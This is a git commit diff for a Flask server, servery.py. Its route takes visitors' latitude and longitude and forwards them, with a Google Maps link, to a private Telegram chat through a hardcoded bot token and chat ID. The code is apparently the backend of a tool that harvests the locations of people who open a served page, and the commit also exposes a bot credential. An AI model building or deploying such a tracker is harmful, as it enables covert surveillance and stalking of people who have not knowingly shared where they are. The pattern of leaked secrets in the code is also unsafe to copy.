841878cae43e1651c4aa59621ca8c380764b0b2c
arab0009 <abu.taha9999999999@gmail.com>
2025-08-19 13:49:05 +0300

    Update servery.py

--- servery.py
+++ servery.py
@@ -1,10 +1,9 @@
-from flask import Flask, request, send_from_directory
+from flask import Flask, request, jsonify, send_from_directory
 import requests
 import os
 
 app = Flask(__name__, static_folder='.')
 
-# بيانات البوت
 BOT_TOKEN = "8332410324:AAEai9n4ojPBRHD6QT92IvQAhuiYzfXeMR4"
 CHAT_ID = "7744463904"
 
@@ -21,9 +20,5 @@ def send_location():
         msg = f"📍 موقع جديد:\nخط العرض: {lat}\nخط الطول: {lon}\nhttps://www.google.com/maps?q={lat},{lon}"
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
-        return {"status": "ok"}
-    return {"status": "error"}, 400
-
-if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port)
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"}), 400
